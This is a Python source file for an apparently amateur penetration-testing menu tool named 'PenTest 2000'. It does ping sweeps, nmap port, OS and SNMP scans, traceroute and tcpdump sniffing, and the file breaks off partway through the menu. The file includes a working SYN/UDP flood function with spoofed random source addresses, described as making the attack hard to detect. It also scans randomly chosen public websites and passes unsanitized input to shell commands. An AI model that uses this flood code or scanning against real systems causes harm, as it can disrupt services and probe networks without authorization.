#!/usr/bin/env python3
import optparse
import argparse
import subprocess
import sys
import random
import time
from datetime import datetime
import multiprocessing
import os
import socket
import nmap
from math import ceil, floor
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

# This lock is used for multiprocessing to prevent simultaneous actions on a file or on the print() function
lock = multiprocessing.Lock()


# A user guide for help
def user_guide():
    # This reads the lines of the file 'user_guide.txt' and returns them
    user_guide_text = open("user_guide.txt", "r+")
    lines = user_guide_text.readlines()
    return lines


# This definition does the actual ping scan started by multiprocess_ping_scan
def ping_scan(ips, alives):
    # This definition pings the hosts in the local network
    # If there is any exception while pinging, we consider the host is down
    dev_null = open(os.devnull, 'w')
    while True:
        # ips is a Queue
        ip = ips.get()

        # This part is related with multiprocessing
        # We create 256 multiprocess and when the first process ends it will get the element at 255 + 1
        # And that element will be none because the next 256 elements after the first 256 elements are None in the Queue
        if ip is None:
            break

        try:
            subprocess.check_call(['ping', '-q', '-c1', ip], stdout=dev_null)
            alives.put(ip)
        except:
            pass


# This definition does the actual port scan with socket started by multiprocess_port_scan
def port_identification(port):
    # In this definition we use socket module to scan tcp ports
    temp_port = port.get()

    # A socket to listen tcp ports is created here
    my_socket_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    my_socket_tcp.settimeout(10)

    # If the result of connect_ex is 0 then the port is open
    # If the result of connect_ex is 11 then the port is filtered
    # And we consider all the other cases as closed
    result_tcp = my_socket_tcp.connect_ex((ip, temp_port))

    # All the found results are written into a file
    if not only_open_ports:
        ports_dat = open("ports.dat", "a")
        if result_tcp == 0:
            with lock:
                try:
                    name = socket.getservbyport(temp_port)
                except OSError:
                    name = "unknown"
                except KeyboardInterrupt:
                    sys.exit("You pressed Ctrl + C")
                ports_dat.write("Port: " + str(temp_port) + "(" + str(name) + ")" + " open\n")
                ports_dat.close()
            my_socket_tcp.close()

        elif result_tcp == 11:
            with lock:
                try:
                    name = socket.getservbyport(temp_port)
                except OSError:
                    name = "unknown"
                except KeyboardInterrupt:
                    sys.exit("You pressed Ctrl + C")
                ports_dat.write("Port: " + str(temp_port) + "(" + str(name) + ")" + " filtered\n")
                ports_dat.close()
            my_socket_tcp.close()
        else:
            with lock:
                try:
                    name = socket.getservbyport(temp_port)
                except OSError:
                    name = "unknown"
                except KeyboardInterrupt:
                    sys.exit("You pressed Ctrl + C")
                ports_dat.write("Port: " + str(temp_port) + "(" + str(name) + ")" + " closed\n")
                ports_dat.close()
            my_socket_tcp.close()
    else:
        if result_tcp == 0:
            with lock:
                open_ports_dat = open("open_ports.dat", "a")
                try:
                    name = socket.getservbyport(temp_port)
                except OSError:
                    name = "unknown"
                except KeyboardInterrupt:
                    sys.exit("You pressed Ctrl + C")
                open_ports_dat.write("Port: " + str(temp_port) + "(" + str(name) + ")" + " open\n")
                open_ports_dat.close()
            my_socket_tcp.close()
        elif result_tcp == 11:
            with lock:
                open_ports_dat = open("open_ports.dat", "a")
                try:
                    name = socket.getservbyport(temp_port)
                except OSError:
                    name = "unknown"
                except KeyboardInterrupt:
                    sys.exit("You pressed Ctrl + C")
                open_ports_dat.write("Port: " + str(temp_port) + "(" + str(name) + ")" + " filtered\n")
                open_ports_dat.close()
            my_socket_tcp.close()


# This definition count the number of hops and prints them out with the hosts
def number_of_hops(host_name):
    # This definition increases the ttl of packets sends until it finds the correct ttl to reach the host
    # The correct ttl means the number of hops required
    for i in range(1, 28):
        packet = IP(dst=host_name, ttl=i) / TCP(flags='A', dport=80)
        # Send the packet and get a reply
        response = sr1(packet, verbose=0)
        try:
            if response is None:
                # If there is no reply we break the loop
                break
            # type == 3 means hosts is unreachable because we have already reached our destination
            elif response.type == 3:
                # Hopping finished and the desired destination has been found
                print("Host is " + str(i) + " hop(s) away", response.src + "\n\n")
                break
            else:
                # Trying to go to the host
                print(str(i) + " hop(s): ", response.src)
        except AttributeError:
            print("Host is " + str(i) + " hop(s) away", response.src + "\n\n")
            break


# This definition works better if the one above (number_of_hops) gets stuck or does not work
def alternative_number_of_hops(host_name):
    # If there are any problems with the custom hop counter this defitinion will help to find the correct result
    # However the maximum number of hops is 20
    print(
        "\nNOTE: Where the SA and repetition of an ip address starts\n"
        "The corresponding number on the left is the hop count\n")
    result, unans = traceroute(host_name, maxttl=20, verbose=1)
    print(result)


# This definition starts processes for ping scan
def multiprocess_ping_scan(base_of_ip, check=True):
    # We create two shared memories which are Queues
    ip_address = multiprocessing.Queue()
    live_hosts = multiprocessing.Queue()
    processes = []

    if check:
        # We format the icmp.dat file
        icmp_dat = open("icmp.dat", "w+")
        icmp_dat.close()
        icmp_dat = open("icmp.dat", "a+")

        # 256 processes are created for each possible host in the local network
        for i in range(256):
            processes.append(multiprocessing.Process(target=ping_scan, args=(ip_address, live_hosts)))

        # Each process is being started
        for i in processes:
            i.start()

        # All the possible hosts are put in a Queue
        for i in range(1, 256):
            ip_address.put(base_of_ip + '{0}'.format(i))

        # The next element of each process will be none and this will help us end all the processes
        for i in processes:
            ip_address.put(None)

        print("Scanning online hosts...")

        # All processes are joined here
        for i in processes:
            i.join()

        # Live host results
        print("\n\n---------- LIVE HOSTS ----------")
        while not live_hosts.empty():
            host = live_hosts.get()
            icmp_dat.write(host + "\n")
            print("         " + host)
        print("--------------------------------\n\n")
        icmp_dat.close()
    else:
        # This part is the same as the other part however in this part we only check the hosts inside icmp.dat file
        # If there are any down hosts in the icmp.dat file then we remove them from the file
        icmp_dat = open("icmp.dat", "r")
        total_lines = len(icmp_dat.readlines())
        icmp_dat.seek(0, 0)
        ip_adds = []
        for i in range(total_lines):
            ip_adds.append(icmp_dat.readline().split())

        for i in range(total_lines):
            processes.append(multiprocessing.Process(target=ping_scan, args=(ip_address, live_hosts)))

        for i in processes:
            i.start()

        for i in ip_adds:
            ip_address.put(i[0])

        for i in processes:
            ip_address.put(None)

        for i in processes:
            i.join()

        icmp_dat.close()
        icmp_dat = open("icmp.dat", "w")
        icmp_dat.close()
        icmp_dat = open("icmp.dat", "a")
        while not live_hosts.empty():
            host = live_hosts.get()
            icmp_dat.write(host + "\n")
        icmp_dat.close()


# This definition starts processes for port scan
def multiprocess_port_scan():
    # A queue has been created for shared memory
    ports = multiprocessing.Queue()
    # This is the port range
    port_diff = int(end_port) - int(start_port)

    # If the port range is bigger than 1000 then we divide the range and take 1000 ports at a time
    if port_diff > 1000:
        port_diff_pieces = port_diff / 1000
        port_diff_pieces = ceil(port_diff_pieces)
        first_number = floor(int(start_port) / 1000)

        for t in range(first_number, first_number + port_diff_pieces):
            # Ports are taken 1000 by 1000
            for i in range(t * 1000, t * 1000 + 1000):
                ports.put(i)

            # 1000 processes
            processes = [multiprocessing.Process(target=port_identification, args=(ports,)) for j in
                         range(1000)]

            # Each process is being started here
            for i in processes:
                i.start()

            # Each process wait for the last process to finish and afterwards they all join
            for i in processes:
                i.join(10)

    # If the port difference is not bigger than a 1000 than we only start processes equal to the port range
    else:
        for i in range(int(start_port), int(end_port) + 1):
            ports.put(i)

        processes = [multiprocessing.Process(target=port_identification, args=(ports,)) for j in
                     range(abs(int(end_port) + 1 - int(start_port)))]

        for i in processes:
            i.start()

        for i in processes:
            i.join(10)


# This definition scans only the open ports
def port_scan_open_only():

    open("open_ports.dat", "w+").close()
    open_ports_dat = open("open_ports.dat", "a")

    nm = nmap.PortScanner()

    # Checking if the hosts in the icmp.dat file are still alive
    print("\nChecking hosts...")
    multiprocess_ping_scan('place_holder', False)
    print("\nPort scan has started...")

    icmp_dat = open("icmp.dat", "r")
    total_lines = len(icmp_dat.readlines())
    icmp_dat.seek(0, 0)
    temp = []
    ip_adds = []

    for i in range(total_lines):
        temp.append(icmp_dat.readline().split())

    for k in range(len(temp)):
        ip_adds.append(temp[k][0])

    # ip_adds contains the online hosts inside the icmp.dat file
    for ip in ip_adds:
        t1 = datetime.now()
        open_ports_dat.write(ip + "\n")

        # nmap port scan for udp and tcp protocols
        nm.scan(ip, arguments="-sU -sT -T3")

        try:
            # nmap module returns output in xml format thus we can reach the elements like they are arrays
            # If there are any protocols then we go deeper
            if len(nm[ip].all_protocols()) > 0:
                proto_tcp = nm[ip].all_protocols()[0]

                open_ports_dat.write("TCP:\n")
                for port in nm[ip][proto_tcp]:
                    open_ports_dat.write(
                        "Port: " + str(port) + "(" + nm[ip][proto_tcp][port]['name'] + ") " + nm[ip][proto_tcp][port][
                            'state'] + "\n")

                if len(nm[ip].all_protocols()) > 1:
                    proto_udp = nm[ip].all_protocols()[1]
                    open_ports_dat.write("UDP:\n")
                    for port in nm[ip][proto_udp]:
                        open_ports_dat.write(
                            "Port: " + str(port) + "(" + nm[ip][proto_udp][port]['name'] + ") " + nm[ip][proto_udp][port][
                                'state'] + "\n")
        # If the host does not exist in the nmap scan then we pass it
        except KeyError:
            pass
        t2 = datetime.now()
        print("Port scan for " + ip + " took " + str(t2 - t1))

    open_ports_dat.close()


# This definition does a protocol and port scan for a specified or a random website
def ip_proto_port_scan_for_web_server(preset):
    # preset options is there if you want to use already existing 60 websites
    if preset:
        print("\nProcess has started...\n")

        # We get the websites from the websites.txt file
        open("web.dat", "w+").close()
        web_dat = open("web.dat", "a")
        nm = nmap.PortScanner()
        websites_txt = open("websites.txt", "r")
        total_lines = len(websites_txt.readlines())
        websites_txt.seek(0, 0)

        websites_list = []
        for i in range(total_lines):
            websites_list.append(websites_txt.readline().split())

        websites_ip_list = []
        rand_check = True
        selected_websites = []
        website_url_list = []

        # 10 random websites are picked from 60 websites
        for i in range(10):
            rand_website = random.randint(0, 60)
            for j in selected_websites:
                if rand_website == j:
                    rand_check = False
                    break

            if rand_check:
                website_url_list.append(websites_list[rand_website][0])
                websites_ip_list.append(socket.gethostbyname(str(websites_list[rand_website][0])))

        cnt_for_url = 0
        for ip in websites_ip_list:
            t1 = datetime.now()

            # This saves the website url for after use
            website_url = website_url_list[cnt_for_url]
            web_dat.write("URL: " + website_url + " Address: " + ip + "\n")

            # nmap scann for udp and tcp ports
            nm.scan(ip, arguments="-sU -sT -T3")

            try:
                # nmap module returns output in xml format thus we can reach the elements like they are arrays
                # If there are any protocols then we go deeper
                if len(nm[ip].all_protocols()) > 0:
                    proto = nm[ip].all_protocols()[0]
                    web_dat.write("TCP:\n")
                    for port in nm[ip][proto]:
                        web_dat.write("Port: " + str(port) + "(" + nm[ip][proto][port][
                            'name'] + ") " + nm[ip][proto][port]['state'] + "\n")



                t2 = datetime.now()
                print("Port scan for " + website_url + " (" + ip + ") " + " took " + str(t2 - t1) + "\n")
                cnt_for_url += 1

            # If the host does not exist in the nmap scan then we pass it
            except KeyError:
                pass

    else:
        custom_url = input("\nPlease enter a URL (Ex: www.google.com): ")
        try:
            url_ip = socket.gethostbyname(custom_url)
            print("\nProcess has started...\n")
            t1 = datetime.now()
            open("web.dat", "w+").close()
            web_dat = open("web.dat", "a")
            nm = nmap.PortScanner()

            web_dat.write("URL: " + custom_url + " Address: " + url_ip + "\n")
            nm.scan(url_ip, arguments="--open -PN")

            try:
                if len(nm[url_ip].all_protocols()) > 0:
                    proto = nm[url_ip].all_protocols()[0]
                    web_dat.write("Protocol: " + proto + "\n")
                    for port in nm[url_ip][proto]:
                        web_dat.write(
                            "Port: " + str(port) + "(" + nm[url_ip][proto][port]['name'] + ") " +
                            nm[url_ip][proto][port][
                                'state'] + "\n")
                        # print(str(port))
                        # print(nm[ip][proto][port]['state'])
                        # print(nm[ip][proto][port]['name'])
            except KeyError:
                pass

            t2 = datetime.now()
            print("\nPort scan for " + custom_url + " (" + url_ip + ") " + " took " + str(t2 - t1) + "\n")

        except socket.gaierror:
            print("\nWrong URL. Please try again.\n")
        except socket.herror:
            print("\nHost seems offline. Please try again later or try another host.\n")
        except:
            print("\nSomething went wrong. Please try again.\n")


# This definition does an os fingerprint detection on the online hosts inside the icmp.dat file
def os_fingerprint_detection():
    open("os_fingerprint.dat", "w+").close()
    os_fingerprint_dat = open("os_fingerprint.dat", "a")

    t1 = datetime.now()
    nm = nmap.PortScanner()

    icmp_dat = open("icmp.dat", "r")
    total_lines = len(icmp_dat.readlines())
    icmp_dat.seek(0, 0)
    temp = []
    ip_adds = []

    for i in range(total_lines):
        temp.append(icmp_dat.readline().split())

    for k in range(len(temp)):
        ip_adds.append(temp[k][0])

    # ip_adds contains the online hosts inside the icmp.dat file
    for ip in ip_adds:
        print("OS Fingerprint Detection for " + ip)

        # This for loop is there to make 10 tries on each host for os detection
        for i in range(1, 11):
            try:
                nm.scan(ip, arguments="-O -v --max-retries 2 -T3")
                print("Vendor -> " + str(nm[ip]['osmatch'][1]['osclass'][0]['vendor']))
                print("OS Family -> " + str(nm[ip]['osmatch'][1]['osclass'][0]['osfamily']))
                print("OS Version -> " + str(nm[ip]['osmatch'][1]['osclass'][0]['osgen']))
                os_fingerprint_dat.write(ip + '\n')
                os_fingerprint_dat.write("Vendor -> " + str(nm[ip]['osmatch'][1]['osclass'][0]['vendor']) + "\n")
                os_fingerprint_dat.write("OS Family -> " + str(nm[ip]['osmatch'][1]['osclass'][0]['osfamily']) + "\n")
                if nm[ip]['osmatch'][1]['osclass'][0]['osgen'] is not None:
                    os_fingerprint_dat.write("OS Version -> " + str(nm[ip]['osmatch'][1]['osclass'][0]['osgen']) + "\n")
                else:
                    os_fingerprint_dat.write("OS Version -> Unknown\n")

                break
            except IndexError:
                print("Try " + str(i) + " Failed... Trying Again...")
                continue
        print("\n")

    os_fingerprint_dat.close()
    t2 = datetime.now()
    print("OS Fingerprint Detection took " + str(t2 - t1))


# This definition does a snmp scan (ports 161 and 162) on the online hosts inside the icmp.dat file
def snmp_scan():
    # The steps in this definition are exactly the same with the port_scan_open_only
    # However in here we only check for the ports 161 and 162
    open("snmp.dat", "w+").close()

    print("\nChecking hosts...")
    multiprocess_ping_scan('place_holder', False)
    print("\nSNMP scan has started...")

    icmp_dat = open("icmp.dat", "r")
    total_lines = len(icmp_dat.readlines())
    icmp_dat.seek(0, 0)

    ip_adds = []
    for i in range(total_lines):
        ip_adds.append(icmp_dat.readline().split())
    icmp_dat.close()

    snmp_dat = open("snmp.dat", "a")
    for i in range(len(ip_adds)):
        ip = ip_adds[i][0]
        print("\n" + ip)

        nm = nmap.PortScanner()
        nm.scan(ip, '161-162', arguments="-sU -sT")

        snmp_dat.write(ip + '\n')
        try:
            if len(nm[ip].all_protocols()) > 0:
                proto_tcp = nm[ip].all_protocols()[0]
                for port in nm[ip][proto_tcp]:
                    print("Port: " + str(port) + "(" + nm[ip][proto_tcp][port]['name'] + ") " + "(" + proto_tcp + ") " +
                          nm[ip][proto_tcp][port][
                              'state'])
                    snmp_dat.write(
                        "Port: " + str(port) + "(" + nm[ip][proto_tcp][port]['name'] + ") " + "(" + proto_tcp + ") " +
                        nm[ip][proto_tcp][port][
                            'state'] + "\n")

            if len(nm[ip].all_protocols()) > 1:
                proto_udp = nm[ip].all_protocols()[1]
                for port in nm[ip][proto_udp]:
                    print("Port: " + str(port) + "(" + nm[ip][proto_udp][port]['name'] + ") " + "(" + proto_udp + ") " +
                          nm[ip][proto_udp][port][
                              'state'])
                    snmp_dat.write(
                        "Port: " + str(port) + "(" + nm[ip][proto_udp][port]['name'] + ") " + "(" + proto_udp + ") " +
                        nm[ip][proto_udp][port][
                            'state'] + "\n")
            print()
        except KeyError:
            pass


# This definition sends a desired amount of tcp packets with SYN flags
def syn_flood_attack(victim_ip, how_many):
    host_ip = socket.gethostbyname(socket.gethostname())

    # We drop the RST and ACK flagged tcp packets to make the victim wait for them
    # Thus causing unnecessary waits, maybe even a denial of service (very low probability)
    os.system("sudo iptables -A OUTPUT -p tcp -s " + host_ip + " --tcp-flags ALL RST,ACK -j DROP")

    for port in range(int(start_port), int(end_port) + 1):

        # A tcpdump process has been started to monitor the attack
        # Only the packets that are destined to the victim will be shown
        monitoring = subprocess.Popen("sudo tcpdump -c" + str(int(how_many) * 1050) + " dst " + victim_ip, shell=True)
        for j in range(int(how_many)):
            # Multiprocessing is used to make the attack more effective
            processes = [multiprocessing.Process(target=flood, args=(victim_ip, port)) for i in range(1000)]
            for i in processes:
                i.start()
            for i in processes:
                i.join()

    # The change we made before to drop RST and ACK packets is reversed here to change everything back to normal
    os.system("sudo iptables -D OUTPUT -p tcp -s " + host_ip + " --tcp-flags ALL RST,ACK -j DROP")
    print("\n\nAttack Done!\n")


# This definitions has the actual SYN packets to be send to the victim
def flood(ip, dst_port):
    # A random ip is picked to make it harder for the host to detect the attack
    rand_ip = random_ips[random.randint(1, 254)]

    # For tcp packets we also have random source ports, random sequence numbers and random windows sizes
    # All these are made in order to make the attack hard to detect
    if for_tcp:
        pkt = IP(dst=ip, src=rand_ip, ttl=64) / TCP(sport=random.randint(1024, 10000), dport=dst_port, flags='S',
                                                    seq=random.randint(1024, 10000), window=random.randint(1024, 10000))

        send(pkt, verbose=0)

    # For udp packets we only have random ips and random destination ports to make the attack hard to detect
    elif for_udp:
        pkt2 = IP(dst=ip, src=rand_ip, ttl=64) / UDP(sport=random.randint(1024, 10000), dport=dst_port)

        send(pkt2, verbose=0)

    # This option does not have anything different but it contains both tcp and udp packets
    elif for_tcp_and_udp:
        pkt = IP(dst=ip, src=rand_ip, ttl=64) / TCP(sport=random.randint(1024, 10000), dport=dst_port, flags='S',
                                                    seq=random.randint(1024, 10000), window=random.randint(1024, 10000))

        send(pkt, verbose=0)

        pkt2 = IP(dst=ip, src=rand_ip, ttl=64) / UDP(sport=random.randint(1024, 10000), dport=dst_port)

        send(pkt2, verbose=0)


# This definition does packet sniffing with the desired options
def packet_sniff():
    print("\n\nPlease be aware that you have to stop this process with 'Ctrl + C' combination!!")
    ip_range = input("\nPlease enter an ip (Ex: 192.168.1.2) or ip range (Ex: 192.168.1.20-45):\n")

    # This if statement checks whether the ip or ip range entered is correct
    if ip_range:
        ip_check = ''
        ip_base = ''

        ip_range_start = ''
        ip_range_end = ''
        dot_count = 0
        range_check = False
        for i in ip_range:
            if len(ip_range) < 7:
                print("\n\nPlease enter correct values for the ip!!!\n")
                return

            try:
                if dot_count < 3:
                    ip_base += i
                    ip_check += i
                if i != "." and i != "-":
                    int(i)
                if i == ".":
                    dot_count += 1
                elif dot_count == 3:
                    if i == "-":
                        range_check = True
                        continue
                    if not range_check:
                        ip_check += i
                        ip_range_start += i
                    if range_check:
                        ip_range_end += i
                if dot_count > 3:
                    print("\n\nPlease enter correct values for the ip!!!\n")
                    return
            except ValueError:
                print("\n\nPlease enter correct values for the ip!!!\n")
                return

        try:
            socket.inet_aton(ip_check)
        except socket.error:
            print("\n\nPlease enter correct values for the ip!!!\n")
            return

        if len(ip_range_end) > 0 and int(ip_range_end) < 256:
            if int(ip_range_end) < int(ip_range_start):
                tmp = ip_range_start
                ip_range_start = ip_range_end
                ip_range_end = tmp
        else:
            ip_range_end = ip_range_start

        hosts_string = ""

        ip_src_dst_host = input("\nWill these ip(s) be source(s), destination(s) or both (Ex: src, dst, both):\n")

        if ip_src_dst_host == "src":
            for i in range(int(ip_range_start), int(ip_range_end) + 1):
                if i == int(ip_range_start):
                    hosts_string += ("src " + ip_base + str(i))
                else:
                    hosts_string += (" or src " + ip_base + str(i))

        if ip_src_dst_host == "dst":
            for i in range(int(ip_range_start), int(ip_range_end) + 1):
                if i == int(ip_range_start):
                    hosts_string += ("dst " + ip_base + str(i))
                else:
                    hosts_string += (" or dst " + ip_base + str(i))

        if ip_src_dst_host == "both":
            for i in range(int(ip_range_start), int(ip_range_end) + 1):
                if i == int(ip_range_start):
                    hosts_string += ("host " + ip_base + str(i))
                else:
                    hosts_string += (" or host " + ip_base + str(i))

    else:
        print("\n\nPlease specify an ip or an ip range!!!\n")
        return

    protocol_input = input("\nPlease select a protocol (Ex: tcp, udp, both):\n")

    # This if statement checks whether the protocol entered is correct
    if protocol_input:
        if protocol_input.lower() == "tcp":
            tcpdump_protocol = "-n tcp "

        elif protocol_input.lower() == "udp":
            tcpdump_protocol = "-n udp "

        elif protocol_input.lower() == "both":
            tcpdump_protocol = "-n "

        else:
            print("\n\nPlease specify a correct protocol!!!\n")
            return

    else:
        print("\n\nPlease specify a correct protocol!!!\n")
        return

    port_range_input = input(
        "\nPlease select source or destination port(s) (Ex: src 80, dst 20-30) or both (Ex: port 80, port 20-80):\n")

    # This if statement checks whether the port or port range entered is correct
    if port_range_input:
        if port_range_input[:3] == "src" and port_range_input[3] == " ":
            port_range = port_range_input[4:]

        elif port_range_input[:3] == "dst" and port_range_input[3] == " ":
            port_range = port_range_input[4:]

        elif port_range_input[:4] == "port" and port_range_input[4] == " ":
            port_range = port_range_input[5:]

        else:
            print("\n\nPlease specify src or dst and enter correct port values!!!\n")
            return

        port_start = ''
        port_end = ''
        dash_check = False

        for i in port_range:
            if i == "-":
                dash_check = True
                continue

            if not dash_check:
                port_start += i

            elif dash_check:
                port_end += i

        try:
            if port_start:
                int(port_start)
            if port_end:
                int(port_end)
        except ValueError:
            print("\n\nPlease enter correct values for port(s)!!!\n")
            return

        if port_end:
            ports_for_port_range = "portrange " + port_start + "-" + port_end
        else:
            ports_for_port_range = "port " + port_start

    else:
        print("\n\nPlease specify a port or a port range!!!\n")
        return

    print("\nSniffing process has been started...\n")

    # Finally this statement starts tcpdump monitoring with the desired options added
    os.system("sudo tcpdump " + tcpdump_protocol + ports_for_port_range + " and '(" + hosts_string + ")'")


def show():
    # Prints the existing files according to your choice
    print("\nPlease select files to print\n")
    print("Your options are:\n1) icmp.dat\n2) ports.dat\n3) open_ports.dat\n4) web.dat\n5) snmp.dat\n6) All the files\n")
    show_choice = input("Your choice:\n")

    if show_choice == '1' or show_choice == '6':
        print("\n\n-----> ICMP.DAT FILE: <-----\n")
        icmp_file = open("icmp.dat", "r+")
        icmp_lines = icmp_file.readlines()
        for line in icmp_lines:
            sys.stdout.write(line)

    if show_choice == '2' or show_choice == '6':
        print("\n\n-----> PORTS.DAT FILE: <-----\n")
        ports_file = open("ports.dat", "r+")
        ports_lines = ports_file.readlines()
        for line in ports_lines:
            sys.stdout.write(line)

    if show_choice == '3' or show_choice == '6':
        print("\n\n-----> OPEN_PORTS.DAT FILE: <-----\n")
        open_port_file = open("open_ports.dat", "r+")
        open_ports_lines = open_port_file.readlines()
        for line in open_ports_lines:
            sys.stdout.write(line)

    if show_choice == '4' or show_choice == '6':
        print("\n\n-----> WEB.DAT FILE: <-----\n")
        web_file = open("web.dat", "r+")
        web_lines = web_file.readlines()
        for line in web_lines:
            sys.stdout.write(line)

    if show_choice == '5' or show_choice == '6':
        print("\n\n-----> SNMP.DAT FILE: <-----\n")
        snmp_file = open("snmp.dat", "r+")
        snmp_lines = snmp_file.readlines()
        for line in snmp_lines:
            sys.stdout.write(line)

    if show_choice != '1' and show_choice != '2' and show_choice != '3' and \
            show_choice != '4' and show_choice != '5' and show_choice != '6':
        print("\n\nPlease enter a correct value for the file choice!!!\n")
        return


while True:
    print("\n-------------------- Welcome to PenTest 2000 (v0.1) --------------------\n")
    print("You can end any process with the 'Ctrl + C' combination!!\n")
    print("-1) Exit")
    print("0) Open user guide ( alternatively type 'pentest.py -h' )")
    print("1) Ping scan your local network")
    print("2) Port scan for the ports of the online hosts")
    print("3) Port scan for the open ports of the online hosts")
    print("4) OS fingerprint detection for the online hosts")
    print("5) Find how many hops away a host (url) is")
    print("6) Alternative hop count of a host (url)")
    print("7) Scan a web server to find its ip, protocols and ports")
    print("8) Check if any of the live hosts have their SNMP ports open")
    print("9) Perform a SYN Flood Attack")
    print("10) Perform tcpdump sniffing to specific hosts, protocols, ports")
    print("11) Print all the files that have been created so far")

    choice = input("\nYour choice: \n")

    if choice == '-1' or choice.lower() == 'exit':
        sys.exit("Exiting PenTest 2000...")

    elif choice == '0':
        # prints the user_guide.txt file on the terminal
        for i in user_guide():
            sys.stdout.write(i)
        print("\n")

    elif choice == '1':
        ip_address = input("\nPlease enter an ip (Ex: 192.168.1.40): ")

        # The statements below check whether the ip address is a legit one
        try:
            socket.inet_aton(ip_address)
        except socket.error:
            print("\n\nPlease enter correct values for the ip!!!\n")
            continue

        counter = 0
        ip_base = ""

        # This for statement gets the ip without the last values (Ex: 192.168.1. )
        for i in ip_address:
            if counter == 3:
                break
            if i == '.':
                counter += 1
            ip_base += i

        if counter != 3:
            print("\n\nPlease enter a correct ip address!!!\n")
            continue

        if len(ip_base) < 6:
            print("\n\nPlease enter a correct ip address!!!\n")
            continue

        # ping scan is initiated
        multiprocess_ping_scan(ip_base)

    elif choice == '2':
        only_open_ports = False
        open("ports.dat", "w+").close()

        port_range = input("\nPlease enter a port (Ex: 80) or a port range (Ex: 20-80):\n")
        start_port = ''
        end_port = ''
        minus_check = False

        # The if statement below checks whether the port or the port range entered is correct
        if len(port_range) > 0:
            for i in port_range:
                if i == "-":
                    minus_check = True
                    continue
                if not minus_check:
                    start_port += i
                if minus_check:
                    end_port += i

            if len(end_port) < 1:
                end_port = start_port

            try:
                if int(end_port) < int(start_port):
                    temp = start_port
                    start_port = end_port
                    end_port = temp
            except ValueError:
                print("\n\nPlease Try Again With Correct Values!!!\n")
                continue
        else:
            print("\n\nPlease Try Again With Correct Values!!!\n")
            continue

        print("\nSTART PORT " + start_port)
        print("END PORT " + end_port)

        print("\nChecking hosts...")

        # Checking if the hosts inside the icmp.dat file are still alive
        multiprocess_ping_scan('place_holder', False)

        icmp_dat = open("icmp.dat", "r")
        total_lines = len(icmp_dat.readlines())
        icmp_dat.seek(0, 0)

        ip_adds = []
        for i in range(total_lines):
            ip_adds.append(icmp_dat.readline().split())
        icmp_dat.close()

        start_time = datetime.now()
        print("\nPort scan has started...")

        # IP addresses are taken from the online hosts of icmp.dat file
        for j in range(len(ip_adds)):
            ports_dat = open("ports.dat", "a")
            t1 = datetime.now()
            ip = ip_adds[j][0]

            ports_dat.write(ip + "\nUDP:\n")

            iterations = ceil((int(end_port) - int(start_port)) / 200)

            nm = nmap.PortScanner()

            for i in range(iterations):
                first = i * 200 + 1
                last = i * 200 + 200

                # Port scan initiated
                # The port are taken 200 by 200
                # This nmap scan only checks for UDP packets because TCP packets are scanned in port_identification
                nm.scan(ip, str(first) + '-' + str(last), arguments="-vvvvvvvv -sU -T5")

                if len(nm[ip].all_protocols()) > 0:
                    try:
                        proto = nm[ip].all_protocols()[0]
                        for port in nm[ip][proto]:
                            ports_dat.write(
                                "Port: " + str(port) + "(" + nm[ip][proto][port]['name'] + ") " + "(" + proto + ") " +
                                nm[ip][proto][port][
                                    'state'] + "\n")
                    except KeyError:
                        pass

            ports_dat.write("TCP:\n")
            ports_dat.close()

            multiprocess_port_scan()

            t2 = datetime.now()
            print("Port scan for " + ip + " took " + str(t2 - t1))

        end_time = datetime.now()
        print("\nAll done in " + str(end_time - start_time) + "\n\n")

    elif choice == '3':
        only_open_ports = True
        open("open_ports.dat", "w+").close()

        port_range = input("\nPlease enter a port (Ex: 80) or a port range (Ex: 20-80) or all (Ex: all):\n")
        start_port = ''
        end_port = ''
        minus_check = False

        # If the input is all we call the port_scan_open_only to scan all the open ports
        if port_range.lower() == 'all':
            t1 = datetime.now()
            port_scan_open_only()
            t2 = datetime.now()
            print("\nAll done in " + str(t2 - t1) + "\n\n")

        else:
            # If the input is not 'all' then we check whether the port range is correct
            if len(port_range) > 0:
                for i in port_range:
                    if i == "-":
                        minus_check = True
                        continue
                    if not minus_check:
                        start_port += i
                    if minus_check:
                        end_port += i

                if len(end_port) < 1:
                    end_port = start_port

                try:
                    if int(end_port) < int(start_port):
                        temp = start_port
                        start_port = end_port
                        end_port = temp
                except ValueError:
                    print("\n\nPlease Try Again With Correct Values!!!\n")
                    continue
            else:
                print("\n\nPlease Try Again With Correct Values!!!\n")
                continue

            print("\nSTART PORT " + start_port)
            print("END PORT " + end_port)

            print("\nChecking hosts...")

            # Checking if the hosts inside the icmp.dat file are still alive
            multiprocess_ping_scan('place_holder', False)

            icmp_dat = open("icmp.dat", "r")
            total_lines = len(icmp_dat.readlines())
            icmp_dat.seek(0, 0)

            ip_adds = []
            for i in range(total_lines):
                ip_adds.append(icmp_dat.readline().split())

            start_time = datetime.now()
            print("\nPort scan has started...")

            # IP addresses are taken from the online hosts of icmp.dat file
            for j in range(len(ip_adds)):
                t1 = datetime.now()
                ip = ip_adds[j][0]

                open_ports_dat = open("open_ports.dat", "a")
                open_ports_dat.write(ip + "\n")
                open_ports_dat.write("UDP:\n")
                nm = nmap.PortScanner()

                # nmap scan is only for UDP port because TCP port are being scanned in port_identification
                nm.scan(ip, str(start_port) + '-' + str(end_port), arguments="--open -sU")
                try:
                    if len(nm[ip].all_protocols()) > 0:

                        proto = nm[ip].all_protocols()[0]
                        for port in nm[ip][proto]:
                            open_ports_dat.write(
                                "Port: " + str(port) + "(" + nm[ip][proto][port]['name'] + ") " + "(" + proto + ") " +
                                nm[ip][proto][port][
                                    'state'] + "\n")
                except KeyError:
                    pass

                open_ports_dat.write("TCP:\n")
                open_ports_dat.close()

                multiprocess_port_scan()

                t2 = datetime.now()
                total_time = t2 - t1
                print("Port scan for " + ip + " took " + str(total_time))

            open_ports_dat.close()
            end_time = datetime.now()
            print("\nAll done in " + str(end_time - start_time) + "\n\n")

    elif choice == '4':
        print("\nChecking hosts...\n")

        # Checking if the hosts inside the icmp.dat file are still alive
        multiprocess_ping_scan('place_holder', False)
        os_fingerprint_detection()

    elif choice == '5':
        print("\nIf packets get stuck please quit with 'Ctrl + C' combination!!")
        host = input("Please enter a host name (Ex: www.google.com):\n")

        # The statement below checks if the url entered is correct
        try:
            socket.gethostbyname(host)
            number_of_hops(host)
        except socket.gaierror:
            print("\n\nPlease enter a correct URL!!!\n")
            continue

    elif choice == '6':
        print("\nIf packets get stuck please quit with 'Ctrl + C' combination!!")
        host = input("Please enter a host name (Ex: www.google.com):\n")

